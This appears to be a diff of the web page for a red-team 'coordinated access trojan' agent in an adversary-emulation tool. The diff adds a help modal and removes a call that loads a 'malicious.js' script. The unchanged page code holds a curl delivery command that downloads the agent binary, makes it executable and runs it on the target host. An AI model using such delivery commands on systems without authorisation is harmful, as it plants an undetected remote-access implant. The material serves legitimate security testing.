@@ -5,6 +5,7 @@
         <link rel="stylesheet" href="/gui/css/shared.css">
         <link rel="stylesheet" href="/gui/css/navbar.css">
         <link rel="stylesheet" href="/sandcat/css/basic.css">
+        <link rel="stylesheet" href="/chain/css/modal.css">
     </head>
     <body>
     <center style="margin-bottom: 100px">
@@ -26,14 +27,15 @@
             <div id="sandcat-blocks" class="row-canvas">
                 <div class="section-profile">
                     <div class="row">
+                        <div class="duk"><img onclick="openDuk1()" class="duk-icon" src="/gui/img/duk.png"></div>
                         <div class="column section-border" style="flex:37%;text-align:left;padding:15px;">
-                            <h1 style="text-shadow: 5px 5px 5px var(--theme-color);font-size:70px;margin-top:-20px;">54ndc47</h1>
+                            <h1 style="font-size:70px;margin-top:-20px;">54ndc47</h1>
                             <h2 style="margin-top:-55px">coordinated access trojan (CAT)</h2>
                             <p>
-                                A sandcat is a desert cat that leaves no footprint. In that vein,
-                                54ndc47 is an agent designed to run without detection on any host operating system.
-                                CATs are deployed by running 1-line <i>delivery commands</i>, based on the
-                                target operating system.
+                                A sand cat is a desert cat that leaves no footprint. In that vein,
+                                54ndc47 is a post-compromise agent designed to run without detection on any host operating system (OS).
+                                You can deploy a CAT by running the 1-line <i>delivery command</i> associated to
+                                your target OS.
                             </p>
                             <select id="dcommands" style="width:60%;" onchange="displayCommand()">
                                 <option disabled="disabled" selected>Select target OS</option>
@@ -52,6 +54,23 @@
                 </div>
             </div>
         </div>
+
+        <div id="duk-modal" class="modal">
+            <form class="modal-content">
+                <div class="container">
+                    <div class="row duk-modal">
+                        <span onclick="document.getElementById('duk-modal').style.display='none'" class="close" title="Close Modal">&times;</span>
+                        <div class="column" style="flex:8%">
+                            <img src="/gui/img/duk.png"/>
+                        </div>
+                        <div class="column" style="flex:92%">
+                            <p id="duk-text" style="color: white"></p>
+                        </div>
+                    </div>
+                </div>
+             </form>
+        </div>
+
         </center>
     </body>
     <script src="/gui/jquery/jquery.js"></script>
@@ -71,17 +90,11 @@
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
             }
         }
-        function actionDownload(phrase){
-            $.getScript('/sandcat/js/malicious.js');
-        }
-        function detachPet(){
-            $.ajax({
-                url: '/plugin/sandcat/pet',
-                type: 'POST',
-                success: function(data, status, options) {
-                    flashy('pet-flash', 'New pet detached!');
-                },
-            });
+        function openDuk1(){
+            document.getElementById("duk-modal").style.display="block";
+            $('#duk-text').text('Did you know... you can deploy a CAT locally, on the same host as the server? You would ' +
+                'do this to test an adversary before running it in the wild. Additionally, a locally deployed CAT is ' +
+                'useful for running initial access adversaries, which can attempt to drop CATs on other, remote hosts.');
         }
     </script>
 </html>
